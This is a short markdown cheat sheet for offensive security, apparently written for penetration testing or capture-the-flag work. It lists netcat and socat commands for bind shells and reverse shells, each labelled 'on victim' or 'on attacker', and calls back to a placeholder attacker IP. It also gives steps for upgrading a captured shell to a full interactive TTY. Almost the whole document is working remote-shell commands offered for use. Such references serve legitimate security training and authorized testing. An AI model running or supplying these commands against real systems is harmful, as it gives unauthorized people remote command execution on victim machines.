# Netcat
**Basic Bind shell**
```bash
# On victim (Listener)
nc -lvnp <PORT> -e /bin/bash # or 'powershell.exe,pipes' if Windows

# On attacker (Kali)
nc <TARGET-IP> <TARGET-PORT>
```

**Basic Reverse shell**
```bash
# On attacker (Listener)
nc -lvnp <PORT>

# On victim
nc <ATTACKER-IP> <ATTACKER-PORT> -e /bin/bash # or 'powershell.exe' if Windows
```

# Socat
**Basic Bind shell**
```bash
# On victim (Listener)
socat TCP-L:<PORT> EXEC:/bin/bash # alternative using socat

# On attacker (Kali)
socat TCP:<TARGET-IP>:<TARGET-PORT> - # alternative using socat
```

**Basic Reverse shell**
```bash
# On attacker (Listener)
socat TCP-L:<PORT>

# On victim
socat TCP:<ATTACKER-IP>:<ATTACKER-PORT> EXEC:"bash -li" # or 'powershell.exe,pipes' if Windows
```

**Advanced Reverse Shell (Linux only)**
```bash
# On attacker (Listener)
socat TCP-L:<PORT> FILE:`tty`,raw,echo=0

# On victim
socat TCP:<ATTACKER-IP>:<ATTACKER-PORT> EXEC:"bash -li",pty,stderr,setsid,sane
```

# Upgrading basic shells
**1) Python pty module**
```bash
# From basic shell, run this command
which python
python -c 'import pty; pty.spawn("/bin/bash")'
```
**2) Using socat (as above)**
**3) Upgrading from netcat with magic**
```bash
# 1) Use python to spawn a pty
python -c 'import pty; pty.spawn("/bin/bash")'

# 2) Background the shell
Ctrl-Z

# 3) Examine current terminal and STTY info to force connected shell to match it
echo $TERM # Take note of the TERM type - "xterm-256color"
stty -a # Take note of the size of current TTY - "rows XX; columns XX"

# 4) Foreground the shell, and reset
fg
reset

# 5) Set the shell, terminal type, and STTY size to match our current window
$ export SHELL=bash
$ export TERM=xterm256-color
$ stty rows 38 columns 116
```
